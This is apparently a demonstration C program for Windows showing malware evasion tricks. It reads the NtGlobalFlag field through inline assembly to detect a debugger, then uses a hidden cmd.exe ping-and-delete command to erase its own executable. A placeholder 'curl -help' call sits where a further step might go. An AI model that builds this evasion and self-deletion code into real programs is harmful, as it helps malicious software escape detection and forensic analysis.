/*
DO NOT
- build under the unicode
- use this in practice
- change curl option
*/

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <psapi.h>
#include <strsafe.h>
#pragma comment(lib, "user32.lib")
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")


__declspec(naked) DWORD getNtGlobalFlag()
{
	__asm {
		mov eax, fs: [0x18]
		mov eax, [eax + 0x30]
		mov eax, [eax + 0x68]
		ret
	}
}

void do_or_die() {
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	exit(0);
}

int main() {

	if (getNtGlobalFlag() == 0x70) {
		do_or_die();
	}

	system("curl -help");
	do_or_die();

	return 0;
}